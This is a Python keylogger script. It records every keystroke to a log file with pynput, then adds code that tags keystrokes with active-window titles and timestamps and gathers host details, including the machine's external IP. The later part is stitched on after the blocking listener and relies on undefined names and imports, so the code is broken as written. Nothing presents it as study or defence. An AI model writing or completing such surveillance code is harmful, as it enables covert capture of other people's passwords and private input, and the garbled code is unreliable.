import pynput
from pynput.keyboard import Key, Listener

counter = 0
keys=[]


def on_press(key):
    global counter, keys
    keys.append(key)
    counter += 1
    if counter >= 10:
        counter = 0
        with open('log.txt', 'a') as f:
            for k in keys:
                f.write(f'{k}')
            f.write('\n')
        keys = []

def on_release(key):
    print(f'Key {key} released')
    if key == Key.esc:
        # Stop listener
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def on_press(key):
    global current_window
    
    # Check if the user switched windows
    active_win = get_active_window()
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = _key_to_text(key)
    
    with open(keys_information, "a", encoding="utf-8") as f:
        # If the window changed, log a header
        if active_win != current_window:
            current_window = active_win
            f.write(f"\n\n--- Window: {current_window} | Time: {timestamp} ---\n")
        
        f.write(text)
        f.flush()


def get_computer_information():
    with open(system_information, "w", encoding="utf-8") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # External IP (Public)
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except Exception:
            public_ip = "Could not fetch public IP"

        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Internal IP: {ip_address}\n")
        f.write(f"External IP: {public_ip}\n")

# Run this once at the start of your script
get_computer_information()